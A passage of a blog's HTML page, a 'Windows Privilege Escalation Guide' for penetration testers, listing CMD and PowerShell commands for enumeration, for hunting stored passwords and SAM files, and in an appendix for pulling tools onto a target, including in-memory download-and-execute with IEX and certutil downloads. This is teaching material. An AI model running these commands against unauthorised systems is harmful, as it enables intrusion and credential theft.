@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Windows Privilege Escalation Guide</title>
+
+  <meta name="author" content="Ryan McFarland" />
+
+  
+
+  <link rel="alternate" type="application/rss+xml" title="absolomb's security blog - absolomb's security blog" href="/feed.xml" />
+
+  
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css" />
+    
+      <link rel="stylesheet" href="/css/main.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-custom.css" />
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Windows Privilege Escalation Guide" />
+  
+
+   
+  <meta property="og:description" content="Privilege escalation always comes down to proper enumeration. But to accomplish proper enumeration you need to know what to check and look for. This takes familiarity with systems that normally comes along with experience. At first privilege escalation can seem like a daunting task, but after a while you start...">
+  
+
+
+  <meta property="og:type" content="website" />
+
+  
+  <meta property="og:url" content="http://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" />
+  <link rel="canonical" href="http://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" />
+  
+
+  
+  <meta property="og:image" content="http://www.absolomb.com/img/bomb.jpg" />
+  
+  
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@" />
+  <meta name="twitter:creator" content="@" />
+
+  
+  <meta name="twitter:title" content="Windows Privilege Escalation Guide" />
+  
+
+  
+  <meta name="twitter:description" content="Privilege escalation always comes down to proper enumeration. But to accomplish proper enumeration you need to know what to check and look for. This takes familiarity with systems that normally comes along with experience. At first privilege escalation can seem like a daunting task, but after a while you start...">
+  
+
+  
+  <meta name="twitter:image" content="http://www.absolomb.com/img/bomb.jpg" />
+  
+
+</head>
+
+
+  <body>
+
+    
+  
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      
+        <a class="navbar-brand" href="http://www.absolomb.com">absolomb's security blog</a>
+      
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+      
+        
+          <li>
+            
+
+
+
+
+
+
+<a href="/Guides">Guides</a>
+
+          </li>
+        
+        
+        
+          <li class="navlinks-container">
+            <a class="navlinks-parent" href="javascript:void(0)">Write-Ups</a>
+            <div class="navlinks-children">
+              
+                
+                  
+
+
+
+
+
+
+<a href="/HackTheBox">HackTheBox</a>
+
+                
+              
+                
+                  
+
+
+
+
+
+
+<a href="/SLAE">SLAE</a>
+
+                
+              
+                
+                  
+
+
+
+
+
+
+<a href="/UnderTheWire">UnderTheWire</a>
+
+                
+              
+            </div>
+          </li>
+        
+        
+        
+          <li>
+            
+
+
+
+
+
+
+<a href="/Archive">Archive</a>
+
+          </li>
+        
+        
+        
+          <li>
+            
+
+
+
+
+
+
+<a href="/aboutme">About Me</a>
+
+          </li>
+        
+        
+      </ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="http://www.absolomb.com ">
+	      <img class="avatar-img" src="/img/bomb.jpg" />
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Windows Privilege Escalation Guide</h1>
+		  
+		  
+		  
+		  <span class="post-meta">Posted on January 26, 2018</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+      
+      <article role="main" class="blog-post">
+        <p>Privilege escalation always comes down to proper enumeration. But to accomplish proper enumeration you need to know what to check and look for. This takes familiarity with systems that normally comes along with experience. At first privilege escalation can seem like a daunting task, but after a while you start to filter through what is normal and what isn’t. It eventually becomes easier to know what to look for rather than digging through everything hoping to find that needle in the haystack. Hopefully this guide will provide a good foundation to build upon and get you started.</p>
+
+<p>This guide is influenced by <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tm1lk’s Basic Linux Privilege Escalation</a>, which at some point you should have already seen and used. I wanted to try to mirror his guide, except for Windows. So this guide will mostly focus on the enumeration aspect.</p>
+
+<p><em>Note: I am not an expert and still learning myself.</em></p>
+
+<h3 id="guide-layout">Guide Layout</h3>
+
+<p>In each section I first provide the old trusted CMD commands and then also a Powershell equivalent for posterity sake. It’s good to have both tools under your belt and Powershell is much more versatile for scripting than the traditional CMD. However there isn’t a Powershell equivalent for everything (or CMD is still simply easier/better on certain things), so some sections will only contain regular CMD commands.</p>
+
+<p><strong>Version 1.3 - Last updated October 2018</strong></p>
+
+<h2 id="operating-system">Operating System</h2>
+
+<p>What is the OS and architecture? Is it missing any patches?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
+wmic qfe
+</code></pre></div></div>
+
+<p>Is there anything interesting in environment variables? A domain controller in <code class="highlighter-rouge">LOGONSERVER</code>?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem </span>Env: | <span class="nb">ft </span>Key,Value
+</code></pre></div></div>
+
+<p>Are there any other connected drives?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use
+wmic logicaldisk get caption,description,providername
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-PSDrive</span> | <span class="nb">where</span> <span class="o">{</span><span class="nv">$_</span>.Provider -like <span class="s2">"Microsoft.PowerShell.Core\FileSystem"</span><span class="o">}</span>| <span class="nb">ft </span>Name,Root
+</code></pre></div></div>
+
+<h2 id="users">Users</h2>
+
+<p>Who are you?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+echo %USERNAME%
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$env</span>:UserName
+</code></pre></div></div>
+
+<p>Any interesting user privileges? <em>Note: The State column does not mean that the user does or does not have access to this privilege. If the privilege is listed, then that user has it.</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+</code></pre></div></div>
+
+<p>What users are on the system? Any old user profiles that weren’t cleaned up?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net users
+dir /b /ad "C:\Users\"
+dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-LocalUser</span> | <span class="nb">ft </span>Name,Enabled,LastLogon
+<span class="nb">Get-ChildItem </span>C:\Users -Force | <span class="nb">select </span>Name
+</code></pre></div></div>
+
+<p>Is anyone else logged in?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qwinsta
+</code></pre></div></div>
+
+<p>What groups are on the system?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-LocalGroup</span> | <span class="nb">ft </span>Name
+</code></pre></div></div>
+
+<p>Are any of the users in the Administrators group?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup Administrators
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-LocalGroupMember </span>Administrators | <span class="nb">ft </span>Name, PrincipalSource
+</code></pre></div></div>
+
+<p>Anything in the Registry for User Autologon?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ItemProperty</span> -Path <span class="s1">'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'</span> | <span class="nb">select</span> <span class="s2">"Default*"</span>
+</code></pre></div></div>
+
+<p>Anything interesting in Credential Manager?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem</span> -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+<span class="nb">Get-ChildItem</span> -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+</code></pre></div></div>
+
+<p>Can we access SAM and SYSTEM files?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+</code></pre></div></div>
+
+<h2 id="programs-processes-and-services">Programs, Processes, and Services</h2>
+
+<p>What software is installed?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem</span> <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | <span class="nb">ft </span>Parent,Name,LastWriteTime
+
+<span class="nb">Get-ChildItem</span> -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | <span class="nb">ft </span>Name
+</code></pre></div></div>
+
+<p>Are there any weak folder or file permissions?</p>
+
+<p>Full Permissions for Everyone or Users on Program Folders?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users" 
+</code></pre></div></div>
+
+<p>Modify Permissions for Everyone or Users on Program Folders?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\*" 2&gt;nul | findstr "(M)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(M)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(M)" | findstr "BUILTIN\Users" 
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(M)" | findstr "BUILTIN\Users" 
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem</span> <span class="s1">'C:\Program Files\*'</span>,<span class="s1">'C:\Program Files (x86)\*'</span> | % <span class="o">{</span> <span class="k">try</span> <span class="o">{</span> <span class="nb">Get-Acl</span> <span class="nv">$_</span> -EA SilentlyContinue | <span class="nb">Where</span> <span class="o">{(</span><span class="nv">$_</span>.Access|select -ExpandProperty IdentityReference<span class="o">)</span> -match <span class="s1">'Everyone'</span><span class="o">}</span> <span class="o">}</span> <span class="k">catch</span> <span class="o">{}}</span> 
+
+<span class="nb">Get-ChildItem</span> <span class="s1">'C:\Program Files\*'</span>,<span class="s1">'C:\Program Files (x86)\*'</span> | % <span class="o">{</span> <span class="k">try</span> <span class="o">{</span> <span class="nb">Get-Acl</span> <span class="nv">$_</span> -EA SilentlyContinue | <span class="nb">Where</span> <span class="o">{(</span><span class="nv">$_</span>.Access|select -ExpandProperty IdentityReference<span class="o">)</span> -match <span class="s1">'BUILTIN\Users'</span><span class="o">}</span> <span class="o">}</span> <span class="k">catch</span> <span class="o">{}}</span> 
+</code></pre></div></div>
+
+<p>You can also upload accesschk from Sysinternals to check for writeable folders and files.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk.exe -qwsu "Everyone" *
+accesschk.exe -qwsu "Authenticated Users" *
+accesschk.exe -qwsu "Users" *
+</code></pre></div></div>
+
+<p>What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it? <em>See Port Forwarding in Appendix.</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /svc
+tasklist /v
+net start
+sc query
+</code></pre></div></div>
+<p><em><code class="highlighter-rouge">Get-Process</code> has a <code class="highlighter-rouge">-IncludeUserName</code> option to see the process owner, however you have to have administrative rights to use it.</em></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Process</span> | <span class="nb">where</span> <span class="o">{</span><span class="nv">$_</span>.ProcessName -notlike <span class="s2">"svchost*"</span><span class="o">}</span> | <span class="nb">ft </span>ProcessName, Id
+<span class="nb">Get-Service</span>
+</code></pre></div></div>
+<p><em>This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.</em></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WmiObject</span> -Query <span class="s2">"Select * from Win32_Process"</span> | <span class="nb">where</span> <span class="o">{</span><span class="nv">$_</span>.Name -notlike <span class="s2">"svchost*"</span><span class="o">}</span> | <span class="nb">Select </span>Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span>;<span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | <span class="nb">ft</span> -AutoSize
+</code></pre></div></div>
+
+<p>Any weak service permissions? Can we reconfigure anything? Again, upload accesschk.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Users" *
+</code></pre></div></div>
+
+<p>Are there any unquoted service paths?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i "Auto" 2&gt;nul |findstr /i /v "C:\Windows\\" 2&gt;nul |findstr /i /v """
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">gwmi</span> -class Win32_Service -Property Name, DisplayName, PathName, StartMode | <span class="nb">Where</span> <span class="o">{</span><span class="nv">$_</span>.StartMode -eq <span class="s2">"Auto"</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s2">"C:\Windows*"</span> -and <span class="nv">$_</span>.PathName -notlike <span class="s1">'"*'</span><span class="o">}</span> | <span class="nb">select </span>PathName,DisplayName,Name
+</code></pre></div></div>
+
+<p>What scheduled tasks are there? Anything custom implemented?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
+dir C:\windows\tasks
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ScheduledTask</span> | <span class="nb">where</span> <span class="o">{</span><span class="nv">$_</span>.TaskPath -notlike <span class="s2">"\Microsoft*"</span><span class="o">}</span> | <span class="nb">ft </span>TaskName,TaskPath,State
+</code></pre></div></div>
+
+<p>What is ran at startup?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-CimInstance </span>Win32_StartupCommand | <span class="nb">select </span>Name, <span class="nb">command</span>, Location, User | <span class="nb">fl
+Get-ItemProperty</span> -Path <span class="s1">'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'</span>
+<span class="nb">Get-ItemProperty</span> -Path <span class="s1">'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'</span>
+<span class="nb">Get-ItemProperty</span> -Path <span class="s1">'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'</span>
+<span class="nb">Get-ItemProperty</span> -Path <span class="s1">'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'</span>
+<span class="nb">Get-ChildItem</span> <span class="s2">"C:\Users\All Users\Start Menu\Programs\Startup"</span>
+<span class="nb">Get-ChildItem</span> <span class="s2">"C:\Users\</span><span class="nv">$env</span><span class="s2">:USERNAME\Start Menu\Programs\Startup"</span>
+</code></pre></div></div>
+
+<p>Is AlwaysInstallElevated enabled? <em>I have not ran across this but it doesn’t hurt to check.</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div></div>
+
+<h2 id="networking">Networking</h2>
+
+<p>What NICs are connected? Are there multiple networks?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig /all
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-NetIPConfiguration</span> | <span class="nb">ft </span>InterfaceAlias,InterfaceDescription,IPv4Address
+<span class="nb">Get-DnsClientServerAddress</span> -AddressFamily IPv4 | <span class="nb">ft</span>
+</code></pre></div></div>
+
+<p>What routes do we have?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route print
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-NetRoute</span> -AddressFamily IPv4 | <span class="nb">ft </span>DestinationPrefix,NextHop,RouteMetric,ifIndex
+</code></pre></div></div>
+
+<p>Anything in the ARP cache?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp -a
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-NetNeighbor</span> -AddressFamily IPv4 | <span class="nb">ft </span>ifIndex,IPAddress,LinkLayerAddress,State
+</code></pre></div></div>
+
+<p>Are there connections to other hosts?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -ano
+</code></pre></div></div>
+
+<p>Anything in the hosts file?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\WINDOWS\System32\drivers\etc\hosts
+</code></pre></div></div>
+
+<p>Is the firewall turned on? If so what’s configured?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export "firewall.txt"
+</code></pre></div></div>
+
+<p>Any other interesting interface configurations?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh dump
+</code></pre></div></div>
+
+<p>Are there any SNMP configurations?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem</span> -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+</code></pre></div></div>
+
+<h2 id="interesting-files-and-sensitive-information">Interesting Files and Sensitive Information</h2>
+
+<p>This section may be a little noisy so you may want to output commands into txt files to review and parse as you wish.</p>
+
+<p>Any passwords in the registry?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s 
+</code></pre></div></div>
+
+<p>Are there sysprep or unattend files available that weren’t cleaned up?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Childitem</span> –Path C:\ -Include <span class="k">*</span>unattend<span class="k">*</span>,<span class="k">*</span>sysprep<span class="k">*</span> -File -Recurse -ErrorAction SilentlyContinue | <span class="nb">where</span> <span class="o">{(</span><span class="nv">$_</span>.Name -like <span class="s2">"*.xml"</span> -or <span class="nv">$_</span>.Name -like <span class="s2">"*.txt"</span> -or <span class="nv">$_</span>.Name -like <span class="s2">"*.ini"</span><span class="o">)}</span>
+</code></pre></div></div>
+
+<p>If the server is an IIS webserver, what’s in inetpub? Any hidden directories? web.config files?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /a C:\inetpub\
+dir /s web.config
+C:\Windows\System32\inetsrv\config\applicationHost.config
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Childitem</span> –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+
+<p>What’s in the IIS Logs?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
+</code></pre></div></div>
+
+<p>Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Childitem</span> –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+
+<p>Any Apache web logs?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s access.log error.log
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Childitem</span> –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+
+<p>Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s *pass* == *vnc* == *.config* 2&gt;nul
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-Childitem</span> –Path C:\Users\ -Include <span class="k">*</span>password<span class="k">*</span>,<span class="k">*</span>vnc<span class="k">*</span>,<span class="k">*</span>.config -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+
+<p>Files containing password inside them?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /si password *.xml *.ini *.txt *.config 2&gt;nul
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ChildItem </span>C:\<span class="k">*</span> -include <span class="k">*</span>.xml,<span class="k">*</span>.ini,<span class="k">*</span>.txt,<span class="k">*</span>.config -Recurse -ErrorAction SilentlyContinue | <span class="nb">Select-String</span> -Pattern <span class="s2">"password"</span>
+</code></pre></div></div>
+
+<h1 id="appendix">Appendix</h1>
+
+<h2 id="enumeration-script">Enumeration Script</h2>
+
+<p>I’ve created a Powershell script which pretty much automates all of the above. You can check it out <a href="https://github.com/absolomb/WindowsEnum">here</a>.</p>
+
+<h2 id="transferring-files">Transferring Files</h2>
+
+<p>At some point during privilege escalation you will need to get files onto your target. Below are some easy ways to do so.</p>
+
+<p>PowerShell Cmdlet (Powershell 3.0 and higher)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Invoke-WebRequest</span> <span class="s2">"https://server/filename"</span> -OutFile <span class="s2">"C:\Windows\Temp\filename"</span>
+</code></pre></div></div>
+
+<p>PowerShell One-Liner</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s2">"https://server/filename"</span>, <span class="s2">"C:\Windows\Temp\filename"</span><span class="o">)</span> 
+</code></pre></div></div>
+
+<p>PowerShell One-Line Script Execution in Memory</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">IEX</span><span class="o">(</span><span class="nb">New-Object </span>Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://server/script.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>PowerShell with Proxy</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$browser</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Net.WebClient;
+<span class="nv">$browser</span>.Proxy.Credentials <span class="o">=</span> <span class="o">[</span>System.Net.CredentialCache]::DefaultNetworkCredentials;
+<span class="nb">IEX</span><span class="o">(</span><span class="nv">$browser</span>.DownloadString<span class="o">(</span><span class="s1">'https://server/script.ps1'</span><span class="o">))</span>;
+</code></pre></div></div>
+
+<p>PowerShell Script</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$webclient</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Net.WebClient <span class="o">&gt;&gt;</span>wget.ps1
+<span class="nb">echo</span> <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://server/file.exe"</span> <span class="o">&gt;&gt;</span>wget.ps1
+<span class="nb">echo</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"output-file.exe"</span> <span class="o">&gt;&gt;</span>wget.ps1
+<span class="nb">echo</span> <span class="nv">$webclient</span>.DownloadFile<span class="o">(</span><span class="nv">$url</span>,<span class="nv">$file</span><span class="o">)</span> <span class="o">&gt;&gt;</span>wget.ps1
+		
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+</code></pre></div></div>
+
+<p>Non-interactive FTP via text file. <em>Useful for when you only have limited command execution.</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo open 10.10.10.11 21&gt; ftp.txt
+echo USER username&gt;&gt; ftp.txt
+echo mypassword&gt;&gt; ftp.txt
+echo bin&gt;&gt; ftp.txt
+echo GET filename&gt;&gt; ftp.txt
+echo bye&gt;&gt; ftp.txt
+		
+ftp -v -n -s:ftp.txt
+</code></pre></div></div>
+
+<p>CertUtil</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -urlcache -split -f https://myserver/filename outputfilename
+</code></pre></div></div>
+
+<p>Certutil can also be used for base64 encoding/decoding.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -encode inputFileName encodedOutputFileName
+certutil.exe -decode encodedInputFileName decodedOutputFileName
+</code></pre></div></div>
+
